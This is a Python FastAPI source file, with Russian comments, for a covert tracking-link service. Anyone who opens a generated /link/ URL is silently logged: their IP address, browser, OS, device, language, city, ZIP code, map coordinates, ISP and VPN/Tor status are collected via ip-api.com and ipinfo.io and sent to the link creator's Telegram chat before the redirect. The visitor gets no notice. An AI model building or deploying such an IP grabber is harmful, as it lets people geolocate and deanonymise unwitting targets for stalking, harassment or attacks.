from fastapi import FastAPI, Request
from fastapi.responses import RedirectResponse
from cryptography.fernet import Fernet
import httpx
import json
from datetime import datetime
from config import SECRET_KEY, BOT_TOKEN
import user_agents
import re

app = FastAPI()
cipher = Fernet(SECRET_KEY)

IPINFO_TOKEN = ""  # Бесплатный план без токена до 50k запросов/мес


def escape_markdown(text: str) -> str:
    """
    Экранирование спецсимволов для MarkdownV2, чтобы Telegram не ругался.
    """
    if not text:
        return "N/A"
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!])', r'\\\1', str(text))


@app.get("/link/{encrypted_url}")
async def redirect_encrypted(request: Request, encrypted_url: str):
    # Расшифровка ссылки
    try:
        data_json = cipher.decrypt(encrypted_url.encode()).decode()
        data = json.loads(data_json)
        original_url = data["url"]
        user_id = data["user_id"]
    except Exception as e:
        print("Ошибка расшифровки:", e)
        return {"error": "Invalid link"}

    ip = request.client.host
    headers = request.headers
    user_agent_str = headers.get("user-agent", "Unknown")
    ua = user_agents.parse(user_agent_str)
    accept_lang = headers.get("accept-language", "N/A")

    geo_info = {}
    vpn_info = {}

    async with httpx.AsyncClient() as client:
        # Гео и сетевые данные через ip-api.com (HTTPS!)
        try:
            geo_resp = await client.get(
                f"https://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp"
            )
            geo_info = geo_resp.json() if geo_resp.status_code == 200 else {}
        except Exception as e:
            print("Ошибка получения geo_info:", e)
            geo_info = {}

        # VPN/Proxy/Tor + ASN через ipinfo.io
        try:
            url = f"https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}" if IPINFO_TOKEN else f"https://ipinfo.io/{ip}/json"
            info_resp = await client.get(url)
            if info_resp.status_code == 200:
                info = info_resp.json()
                vpn_info = {
                    "vpn": info.get("privacy", {}).get("vpn", "N/A"),
                    "proxy": info.get("privacy", {}).get("proxy", "N/A"),
                    "tor": info.get("privacy", {}).get("tor", "N/A"),
                    "asn": info.get("org", "N/A").split(" ")[0] if info.get("org") else "N/A",
                    "org": info.get("org", "N/A"),
                    "connection_type": info.get("type", "N/A"),
                    "timezone": info.get("timezone", "N/A")
                }
        except Exception as e:
            print("Ошибка получения vpn_info:", e)
            vpn_info = {
                "vpn": "N/A", "proxy": "N/A", "tor": "N/A",
                "asn": "N/A", "org": "N/A", "connection_type": "N/A", "timezone": "N/A"
            }

    # Формируем сообщение
    msg_text = f"""
🔗 *Кто-то кликнул по твоей ссылке!*

🕒 Время: {escape_markdown(datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S'))} UTC
🌐 IP: {escape_markdown(ip)}
🖥 User-Agent: {escape_markdown(user_agent_str)}
🌏 Язык системы: {escape_markdown(accept_lang)}

💻 Платформа: {escape_markdown(ua.os.family)} {escape_markdown(ua.os.version_string)}
🌍 Браузер: {escape_markdown(ua.browser.family)} {escape_markdown(ua.browser.version_string)}
📱 Тип устройства: {escape_markdown(ua.device.family)}

🏙 Гео:
- Страна: {escape_markdown(geo_info.get('country', 'N/A'))}
- Регион: {escape_markdown(geo_info.get('regionName', 'N/A'))}
- Город: {escape_markdown(geo_info.get('city', 'N/A'))}
- ZIP: {escape_markdown(geo_info.get('zip', 'N/A'))}
- ISP: {escape_markdown(geo_info.get('isp', 'N/A'))}
- Координаты: {escape_markdown(geo_info.get('lat', 'N/A'))}, {escape_markdown(geo_info.get('lon', 'N/A'))}
- [Google Maps](https://www.google.com/maps?q={geo_info.get('lat','')},{geo_info.get('lon','')})

🌐 Сетевая информация:
- ASN: {escape_markdown(vpn_info.get('asn'))}
- Организация: {escape_markdown(vpn_info.get('org'))}
- Тип подключения: {escape_markdown(vpn_info.get('connection_type'))}
- Часовой пояс: {escape_markdown(vpn_info.get('timezone'))}

🔒 VPN/Proxy/Tor:
- VPN: {escape_markdown(vpn_info.get('vpn'))}
- Proxy: {escape_markdown(vpn_info.get('proxy'))}
- Tor: {escape_markdown(vpn_info.get('tor'))}
"""

    # Логируем сообщение перед отправкой
    print("==== Сформированное сообщение ====")
    print(msg_text)
    print("=================================")

    # Отправка в Telegram
    try:
        async with httpx.AsyncClient() as client:
            resp = await client.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={"chat_id": user_id, "text": msg_text, "parse_mode": "MarkdownV2"}
            )
            print("Ответ от Telegram:", resp.text)
    except Exception as e:
        print("Ошибка отправки в Telegram:", e)

    return RedirectResponse(original_url)


if __name__ == "__main__":
    import uvicorn
    print("Сервер запущен на порту 8000")
    uvicorn.run(app, host="0.0.0.0", port=8000)